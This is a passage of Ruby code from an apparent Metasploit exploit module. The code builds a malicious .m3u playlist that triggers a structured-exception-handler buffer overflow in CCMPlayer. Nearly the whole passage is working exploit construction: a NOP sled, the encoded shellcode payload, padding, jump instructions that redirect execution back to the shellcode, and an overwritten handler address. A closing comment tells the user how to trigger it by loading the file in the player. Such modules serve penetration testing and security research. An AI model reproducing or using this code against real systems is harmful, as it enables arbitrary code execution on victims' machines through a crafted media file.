m3u = "C:\\"
# shellcode
m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "nop").encode_string * 25
m3u << payload.encoded
# junk
m3u << rand_text_alpha_upper(target['Offset'] - (25 + payload.encoded.length))
# need an access violation when reading next 4 bytes as address (0xFFFFFFFF)
# to trigger SEH
m3u << [0xffffffff].pack("V")
# pad
m3u << rand_text_alpha_upper(3)
# long jmp: jmp far back to shellcode
m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-4103").encode_string
# NSEH: jmp short back to long jmp instruction
m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-5").encode_string
# pad (need more 2 bytes to fill up to 4, as jmp $-5 are only 2 bytes)
m3u << rand_text_alpha_upper(2)
# SEH Exception Handler Address -> p/p/r
m3u << [target.ret].pack("V")
m3u << ".mp3\r\n" # no crash without it
 
print_status("Creating '#{datastore['FILENAME']}' file ...")
 
# Open CCMPlayer -> Songs -> Add -> Files of type: m3u -> msf.m3u => exploit
file_create(m3u)